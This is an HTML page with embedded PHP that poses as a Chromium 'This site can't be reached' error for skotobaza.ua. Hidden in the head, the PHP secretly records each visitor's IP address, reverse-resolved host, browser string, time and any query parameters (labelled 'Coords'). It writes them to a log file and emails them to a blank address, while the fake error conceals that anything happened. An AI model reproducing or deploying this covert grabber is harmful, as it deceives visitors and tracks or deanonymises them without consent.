<DOCYTUPE html>
<html>
<head>
<title>error_404</title>

<?php

$fopen = fopen ("logs.txt", "a+");
fputs ($fopen," ======== DETECT! ========".PHP_EOL);
$get_time = date("d.m.Y (H:i:s)", time().PHP_EOL);
foreach ($_GET as $key => $value)

fputs ($fopen,"Coords: $key $value".PHP_EOL);

$get_ip = getenv("REMOTE_ADDR");
$get_browser = getenv("HTTP_USER_AGENT");
$get_host = gethostbyaddr(getenv("REMOTE_ADDR"));

fputs ($fopen, "Time: $get_time".PHP_EOL);
fputs ($fopen, "Host: $get_host ".PHP_EOL);
fputs ($fopen, "IP: $get_ip".PHP_EOL);
fputs ($fopen, "Browser: $get_browser ".PHP_EOL.PHP_EOL.PHP_EOL.PHP_EOL);

fclose($fopen);

	$email = '';
	$email2 = '';
	$tema = '========DETECT========';
	$tekst = "
	
	Time: $get_time
	
	Ip: $get_ip
	
	Browser: $get_browser
	
	Host: $get_host
	
	Coords: $_GET as $key => $value
	
	Saved to: https://.../logs.txt
	
	";
		mail($email2,$tema,$tekst,"From: $email");
?>

</head>
<body>
	<div id="main-content" jstcache="0" style="color: #646464; font-family: sans, Arial, sans-serif; font-size: 15px; background-color: #ffffff;">
	<div id="main-message" jstcache="0">
		<h1 jsselect="heading" jstcache="5" jsvalues=".innerHTML:msg" style="color: #333333; font-size: 1.6em; font-weight: normal; line-height: 1.25em; margin-bottom: 16px; margin-top: 0px; overflow-wrap: break-word;">This site can&rsquo;t be reached</h1>
		<p jsselect="summary" jstcache="2" jsvalues=".innerHTML:msg" style="display: inline;"><strong jscontent="hostName" jstcache="16" style="overflow-wrap: break-word;">skotobaza.ua</strong>&rsquo;s server IP address could not be found.</p>
		<div id="suggestions-list" jsdisplay="(suggestionsSummaryList &amp;&amp; suggestionsSummaryList.length)" jstcache="6">
			<p jstcache="13" jsvalues=".innerHTML:suggestionsSummaryListHeader" style="margin-block-end: 0px;">Try:</p>
			<ul jstcache="14" jsvalues=".className:suggestionsSummaryList.length == 1 ? 'single-suggestion' : ''" style="margin-top: 0px;">
				<li jsinstance="0" jsselect="suggestionsSummaryList" jstcache="15" jsvalues=".innerHTML:summary">Checking the connection</li>
				<li jsinstance="*1" jsselect="suggestionsSummaryList" jstcache="15" jsvalues=".innerHTML:summary"><a href="http://skotobaza1.com/" jstcache="0" style="color: #1155cc; text-decoration-line: none;">Checking the proxy, firewall, and DNS configuration</a></li>
			</ul>
		</div>
		<div class="error-code" jscontent="errorCode" jstcache="7" style="font-size: 0.8em; text-transform: uppercase;">ERR_NAME_NOT_RESOLVED</div>
	</div>
</div>
<div class="nav-wrapper suggested-right" id="buttons" jstcache="0" style="margin-top: 51px; padding-bottom: 16px; color: #646464; font-family: sans, Arial, sans-serif; font-size: 15px; background-color: #ffffff;">
	<div id="control-buttons" jstcache="0" style="float: right;"><button class="blue-button text-button" id="reload-button" jscontent="msg" jsselect="reloadButton" jstcache="8" jsvalues=".url:reloadUrl; .trackingId:reloadTrackingId" style="border-width: 0px; border-style: initial; border-color: initial; border-radius: 2px; color: #ffffff; cursor: pointer; float: right; font-size: 0.875em; margin: 0px; padding: 10px 24px; transition: box-shadow 200ms cubic-bezier(0.4, 0, 0.2, 1) 0s; user-select: none; background: #4285f4;">Reload</button></div>
<div id="details" jstcache="0" style="color: #696969; margin: 0px 0px 50px; font-family: sans, Arial, sans-serif; font-size: 15px; background-color: #ffffff;">
	<div class="suggestions" jsinstance="0" jsselect="suggestionsDetails" jstcache="4" style="margin-top: 18px;">
		<div class="suggestion-header" jstcache="11" jsvalues=".innerHTML:header" style="font-weight: bold; margin-bottom: 4px;">Check your Internet connection</div>
		<div class="suggestion-body" jstcache="12" jsvalues=".innerHTML:body" style="color: #777777;">Check any cables and reboot any routers, modems, or other network devices you may be using.</div>
	</div>
	<div class="suggestions" jsinstance="1" jsselect="suggestionsDetails" jstcache="4" style="margin-top: 18px;">
		<div class="suggestion-header" jstcache="11" jsvalues=".innerHTML:header" style="font-weight: bold; margin-bottom: 4px;">Check your DNS settings</div>
		<div class="suggestion-body" jstcache="12" jsvalues=".innerHTML:body" style="color: #777777;">Contact your network administrator if you&#39;re not sure what this means.</div>
	</div>
	<div class="suggestions" jsinstance="2" jsselect="suggestionsDetails" jstcache="4" style="margin-top: 18px;">
		<div class="suggestion-header" jstcache="11" jsvalues=".innerHTML:header" style="font-weight: bold; margin-bottom: 4px;">Try disabling network prediction</div>
		<div class="suggestion-body" jstcache="12" jsvalues=".innerHTML:body" style="color: #777777;">Go to the Chromium menu &gt;&nbsp;<span jscontent="settingsTitle" jstcache="17">Settings</span>&nbsp;&gt;&nbsp;<span jscontent="advancedTitle" jstcache="18">Show advanced settings&hellip;</span>&nbsp;and deselect &quot;<span jscontent="noNetworkPredictionTitle" jstcache="19">Use a prediction service to load pages more quickly</span>.&quot; If this does not resolve the issue, we recommend selecting this option again for improved performance.</div>
	</div>
	<div class="suggestions" jsinstance="3" jsselect="suggestionsDetails" jstcache="4" style="margin-top: 18px;">
		<div class="suggestion-header" jstcache="11" jsvalues=".innerHTML:header" style="font-weight: bold; margin-bottom: 4px;">Allow Chromium to access the network in your firewall or antivirus settings.</div>
		<div class="suggestion-body" jstcache="12" jsvalues=".innerHTML:body" style="color: #777777;">If it is already listed as a program allowed to access the network, try removing it from the list and adding it again.</div>
	</div>
	<div class="suggestions" jsinstance="*4" jsselect="suggestionsDetails" jstcache="4" style="margin-top: 18px;">
		<div class="suggestion-header" jstcache="11" jsvalues=".innerHTML:header" style="font-weight: bold; margin-bottom: 4px;">If you use a proxy server&hellip;</div>
		<div class="suggestion-body" jstcache="12" jsvalues=".innerHTML:body" style="color: #777777;">Check your proxy settings or contact your network administrator to make sure the proxy server is working. If you don&#39;t believe you should be using a proxy server: Go to the Chromium menu &gt;&nbsp;<span jscontent="settingsTitle" jstcache="17">Settings</span>&nbsp;&gt;&nbsp;<span jscontent="advancedTitle" jstcache="18">Show advanced settings&hellip;</span>&nbsp;&gt;<span jscontent="proxyTitle" jstcache="20">Change proxy settings&hellip;</span>&nbsp;and make sure your configuration is set to &quot;no proxy&quot; or &quot;direct.&quot;</div>
	</div>
</div>
<p>&nbsp;</p>

<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</body>
</html>
